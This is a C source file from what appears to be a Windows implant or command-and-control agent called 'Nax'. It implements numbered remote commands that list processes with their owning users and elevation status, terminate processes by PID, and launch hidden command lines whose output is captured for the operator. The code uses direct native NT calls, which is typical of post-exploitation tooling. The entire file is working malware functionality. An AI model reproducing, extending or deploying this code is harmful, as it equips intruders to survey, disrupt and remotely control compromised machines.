#include "Nax.h"
#include "Common.h"

/* ========= [ TokenToUser - resolve SID to domain\username + elevation ] ========= */

static BOOL NaxTokenToUser( PNAX_INSTANCE Nax, HANDLE hToken, PCHAR username, DWORD* usernameSize, PCHAR domain, DWORD* domainSize, BOOL* elevated ) {
    if ( !hToken || !Nax->Advapi32.GetTokenInformation || !Nax->Advapi32.LookupAccountSidA )
        return FALSE;

    BOOL result = FALSE;
    DWORD tokenInfoSize = 0;

    Nax->Advapi32.GetTokenInformation( hToken, TokenUser, NULL, 0, &tokenInfoSize );
    if ( tokenInfoSize == 0 ) return FALSE;

    PVOID tokenInfo = Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, tokenInfoSize );
    if ( !tokenInfo ) return FALSE;

    if ( Nax->Advapi32.GetTokenInformation( hToken, TokenUser, tokenInfo, tokenInfoSize, &tokenInfoSize ) ) {
        SID_NAME_USE sidType;
        result = Nax->Advapi32.LookupAccountSidA( NULL, ((PTOKEN_USER)tokenInfo)->User.Sid, username, usernameSize, domain, domainSize, &sidType );
    }

    struct { DWORD TokenIsElevated; } elev;
    DWORD elevSize = sizeof( elev );
    if ( Nax->Advapi32.GetTokenInformation( hToken, (TOKEN_INFORMATION_CLASS)20, &elev, sizeof( elev ), &elevSize ) )
        *elevated = elev.TokenIsElevated ? TRUE : FALSE;

    Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, tokenInfo );
    return result;
}

/* ========= [ CMD_PS_LIST (0x23) ] ========= */

FUNC INT CmdPsList( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
    (void)args; (void)args_len;
    if ( *out_len < 5 ) return NAX_ERR_NOMEM;

    ULONG spiSize = 0;
    NTSTATUS status = Nax->Ntdll.NtQuerySystemInformation( SystemProcessInformation, NULL, 0, &spiSize );
    if ( status != STATUS_INFO_LENGTH_MISMATCH ) {
        out[0] = 0;
        out[1] = NAX_ERROR_INVALID_PARAMETER; out[2] = 0; out[3] = 0; out[4] = 0;
        *out_len = 5;
        return NAX_OK;
    }

    spiSize += NAX_SYSINFO_EXTRA_BUF;
    PSYSTEM_PROCESS_INFORMATION spi = (PSYSTEM_PROCESS_INFORMATION)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, spiSize );
    if ( !spi ) return NAX_ERR_NOMEM;

    status = Nax->Ntdll.NtQuerySystemInformation( SystemProcessInformation, spi, spiSize, &spiSize );
    if ( !NT_SUCCESS( status ) ) {
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, spi );
        out[0] = 0;
        out[1] = NAX_ERROR_INVALID_PARAMETER; out[2] = 0; out[3] = 0; out[4] = 0;
        *out_len = 5;
        return NAX_OK;
    }

    PSYSTEM_PROCESS_INFORMATION spiStart = spi;
    DWORD accessMask = PROCESS_QUERY_LIMITED_INFORMATION;
    UINT32 cap = *out_len;

    out[0] = 1;
    PBYTE countPos = out + 1;
    UINT32 pos = 5;
    UINT32 count = 0;

    do {
        if ( !spi->ImageName.Buffer ) goto next_entry;

        BOOL  elevated  = FALSE;
        BYTE  arch64    = NAX_ARCH_UNKNOWN;
        CHAR  procName[260];
        DWORD usernameLen = MAX_PATH;
        CHAR  username[MAX_PATH];
        DWORD domSize   = MAX_PATH;
        CHAR  domain[MAX_PATH];
        MmZero( procName, 260 );
        MmZero( username, MAX_PATH );
        MmZero( domain, MAX_PATH );

        OBJECT_ATTRIBUTES objAttr;
        MmZero( &objAttr, sizeof( objAttr ) );
        objAttr.Length = sizeof( OBJECT_ATTRIBUTES );

        HANDLE hProcess = NULL;
        HANDLE hToken   = NULL;
        CLIENT_ID clientId;
        MmZero( &clientId, sizeof( clientId ) );
        clientId.UniqueProcess = spi->UniqueProcessId;

        NTSTATUS ns = Nax->Ntdll.NtOpenProcess( &hProcess, accessMask, &objAttr, &clientId );
        if ( NT_SUCCESS( ns ) ) {
            ULONG_PTR piWow64 = 0;
            ns = Nax->Ntdll.NtQueryInformationProcess( hProcess, ProcessWow64Information, &piWow64, sizeof( ULONG_PTR ), NULL );
            if ( NT_SUCCESS( ns ) )
                arch64 = ( piWow64 == 0 ) ? 1 : 0;

            ns = Nax->Ntdll.NtOpenProcessToken( hProcess, NAX_TOKEN_QUERY, &hToken );
            if ( NT_SUCCESS( ns ) )
                NaxTokenToUser( Nax, hToken, username, &usernameLen, domain, &domSize, &elevated );
        }

        UINT32 imgChars = spi->ImageName.Length / 2;
        if ( imgChars > 259 ) imgChars = 259;
        Nax->Kernel32.WideCharToMultiByte( CP_UTF8, 0, spi->ImageName.Buffer, (INT)imgChars, procName, 259, NULL, NULL );

        UINT32 pnLen = 0; while ( procName[pnLen] ) pnLen++;
        UINT32 unLen = 0; while ( username[unLen] ) unLen++;
        UINT32 dmLen = 0; while ( domain[dmLen] ) dmLen++;

        UINT32 entrySize = 2 + 2 + 2 + 1 + 1 + 2 + dmLen + 2 + unLen + 2 + pnLen;
        if ( pos + entrySize > cap ) goto cleanup;

        PBYTE p = out + pos;
        NaxW16( p, (UINT16)(UINT_PTR)spi->UniqueProcessId );             p += 2;
        NaxW16( p, (UINT16)(UINT_PTR)spi->InheritedFromUniqueProcessId ); p += 2;
        NaxW16( p, (UINT16)spi->SessionId );                             p += 2;
        *p++ = arch64;
        *p++ = elevated ? 1 : 0;
        NaxW16( p, (UINT16)dmLen ); p += 2;
        if ( dmLen > 0 ) { MmCopy( p, domain, dmLen ); p += dmLen; }
        NaxW16( p, (UINT16)unLen ); p += 2;
        if ( unLen > 0 ) { MmCopy( p, username, unLen ); p += unLen; }
        NaxW16( p, (UINT16)pnLen ); p += 2;
        if ( pnLen > 0 ) { MmCopy( p, procName, pnLen ); p += pnLen; }

        pos += entrySize;
        count++;

        if ( hProcess ) Nax->Ntdll.NtClose( hProcess );
        if ( hToken )   Nax->Ntdll.NtClose( hToken );
        goto next_entry;

    cleanup:
        if ( hProcess ) Nax->Ntdll.NtClose( hProcess );
        if ( hToken )   Nax->Ntdll.NtClose( hToken );
        break;

    next_entry:
        if ( !spi->NextEntryOffset ) break;
        spi = (PSYSTEM_PROCESS_INFORMATION)( (PBYTE)spi + spi->NextEntryOffset );
    } while ( 1 );

    countPos[0] = (BYTE)( count & 0xFF );
    countPos[1] = (BYTE)( ( count >> 8 ) & 0xFF );
    countPos[2] = (BYTE)( ( count >> 16 ) & 0xFF );
    countPos[3] = (BYTE)( ( count >> 24 ) & 0xFF );

    *out_len = pos;
    Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, spiStart );
    return NAX_OK;
}

/* ========= [ CMD_PS_KILL (0x24) ] ========= */

FUNC INT CmdPsKill( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
    if ( args_len < 4 || *out_len < 4 ) return NAX_ERR_INVAL;

    UINT32 pid = (UINT32)args[0] | ( (UINT32)args[1] << 8 ) | ( (UINT32)args[2] << 16 ) | ( (UINT32)args[3] << 24 );

    OBJECT_ATTRIBUTES objAttr;
    MmZero( &objAttr, sizeof( objAttr ) );
    objAttr.Length = sizeof( OBJECT_ATTRIBUTES );

    CLIENT_ID clientId;
    MmZero( &clientId, sizeof( clientId ) );
    clientId.UniqueProcess = (HANDLE)(UINT_PTR)pid;

    HANDLE hProcess = NULL;
    NTSTATUS status = Nax->Ntdll.NtOpenProcess( &hProcess, PROCESS_TERMINATE, &objAttr, &clientId );
    if ( !NT_SUCCESS( status ) ) {
        NaxWriteWin32Err( out, out_len );
        return NAX_ERR_FAIL;
    }

    status = Nax->Ntdll.NtTerminateProcess( hProcess, 0 );
    Nax->Ntdll.NtClose( hProcess );

    if ( !NT_SUCCESS( status ) ) {
        NaxWriteWin32Err( out, out_len );
        return NAX_ERR_FAIL;
    }

    out[0] = (BYTE)( pid & 0xFF );
    out[1] = (BYTE)( ( pid >> 8 ) & 0xFF );
    out[2] = (BYTE)( ( pid >> 16 ) & 0xFF );
    out[3] = (BYTE)( ( pid >> 24 ) & 0xFF );
    *out_len = 4;
    return NAX_OK;
}

/* ========= [ CMD_PS_RUN (0x25) ] ========= */

FUNC INT CmdPsRun( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
    if ( args_len < 5 || *out_len < 5 ) return NAX_ERR_INVAL;

    BYTE flags      = args[0];
    BYTE wantOutput = ( flags & 0x01 ) ? 1 : 0;
    BYTE suspended  = ( flags & 0x02 ) ? 1 : 0;
    UINT32 cmdLen = (UINT32)args[1] | ( (UINT32)args[2] << 8 ) | ( (UINT32)args[3] << 16 ) | ( (UINT32)args[4] << 24 );
    if ( 5 + cmdLen > args_len || cmdLen == 0 ) return NAX_ERR_INVAL;

    PCHAR cmdline = (PCHAR)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, cmdLen + 1 );
    if ( !cmdline ) return NAX_ERR_NOMEM;
    MmCopy( cmdline, args + 5, cmdLen );
    cmdline[cmdLen] = '\0';

    HANDLE pipeRead = NULL, pipeWrite = NULL;

    if ( wantOutput && !suspended ) {
        SECURITY_ATTRIBUTES sa;
        MmZero( &sa, sizeof( sa ) );
        sa.nLength = sizeof( SECURITY_ATTRIBUTES );
        sa.bInheritHandle = TRUE;
        if ( !Nax->Kernel32.CreatePipe( &pipeRead, &pipeWrite, &sa, 0 ) ) {
            Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, cmdline );
            NaxWriteWin32Err( out, out_len );
            return NAX_ERR_FAIL;
        }
    }

    STARTUPINFOA si;
    MmZero( &si, sizeof( si ) );
    si.cb = sizeof( STARTUPINFOA );
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if ( wantOutput && !suspended ) {
        si.hStdOutput = pipeWrite;
        si.hStdError  = pipeWrite;
    }

    PROCESS_INFORMATION pi;
    MmZero( &pi, sizeof( pi ) );

    DWORD creationFlags = CREATE_NO_WINDOW;
    if ( suspended ) creationFlags |= CREATE_SUSPENDED;

    BOOL ok = Nax->Kernel32.CreateProcessA( NULL, cmdline, NULL, NULL, ( wantOutput && !suspended ) ? TRUE : FALSE, creationFlags, NULL, NULL, &si, &pi );
    Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, cmdline );

    if ( !ok ) {
        if ( pipeRead )  Nax->Kernel32.CloseHandle( pipeRead );
        if ( pipeWrite ) Nax->Kernel32.CloseHandle( pipeWrite );
        NaxWriteWin32Err( out, out_len );
        return NAX_ERR_FAIL;
    }

    UINT32 pid = (UINT32)(UINT_PTR)pi.dwProcessId;

    /* Write result header: pid(4LE) + flags(1) */
    out[0] = (BYTE)( pid & 0xFF );
    out[1] = (BYTE)( ( pid >> 8 ) & 0xFF );
    out[2] = (BYTE)( ( pid >> 16 ) & 0xFF );
    out[3] = (BYTE)( ( pid >> 24 ) & 0xFF );
    out[4] = flags;
    UINT32 pos = 5;

    if ( wantOutput && !suspended ) {
        Nax->Kernel32.CloseHandle( pipeWrite );
        pipeWrite = NULL;

        Nax->Kernel32.WaitForSingleObject( pi.hProcess, NAX_PS_OUTPUT_WAIT_MS );

        BYTE readBuf[4096];
        for ( ;; ) {
            DWORD avail = 0;
            if ( !Nax->Kernel32.PeekNamedPipe( pipeRead, NULL, 0, NULL, &avail, NULL ) || avail == 0 ) break;

            DWORD bytesRead = 0;
            DWORD toRead = avail < sizeof( readBuf ) ? avail : sizeof( readBuf );
            if ( !Nax->Kernel32.ReadFile( pipeRead, readBuf, toRead, &bytesRead, NULL ) || bytesRead == 0 ) break;

            UINT32 space = ( *out_len > pos ) ? ( *out_len - pos ) : 0;
            UINT32 copy = ( bytesRead <= space ) ? bytesRead : space;
            if ( copy > 0 ) {
                MmCopy( out + pos, readBuf, copy );
                pos += copy;
            }
            if ( copy < bytesRead ) break;
        }
        Nax->Kernel32.CloseHandle( pipeRead );

        Nax->Ntdll.NtTerminateProcess( pi.hProcess, 0 );
    }

    Nax->Kernel32.CloseHandle( pi.hProcess );
    Nax->Kernel32.CloseHandle( pi.hThread );

    *out_len = pos;
    return NAX_OK;
}
